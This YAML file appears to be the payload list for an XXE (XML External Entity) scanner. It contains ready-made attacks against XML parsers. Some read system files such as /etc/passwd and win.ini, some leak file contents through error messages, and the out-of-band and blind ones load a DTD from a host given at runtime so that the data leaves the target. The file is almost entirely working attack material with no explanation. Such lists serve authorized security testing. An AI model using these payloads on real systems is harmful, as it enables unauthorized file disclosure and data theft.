# XML External Entity (XXE) Payloads
# Edit this file to add or remove payloads without touching source code.
# The {oob} placeholder is replaced with the --oob-host value at runtime.

payloads:
  in_band:
    - '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
    - '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>'
    - '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>'

  error_based:
    - '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM ''file:///nonexistent/%file;''>">%eval;%error;]><root>test</root>'
    - '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd">%file;]><root>test</root>'

  oob:
    - '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://{oob}/xxe.dtd">%dtd;]><root>&send;</root>'
    - '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://{oob}/xxe.dtd">%dtd;]><root>test</root>'
    - '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://{oob}/xxe-data">]><root>&xxe;</root>'
    - '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "https://{oob}/xxe-data">]><root>&xxe;</root>'

  blind:
    - '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://{oob}/xxe-oob.dtd">%dtd;]><root>&send;</root>'
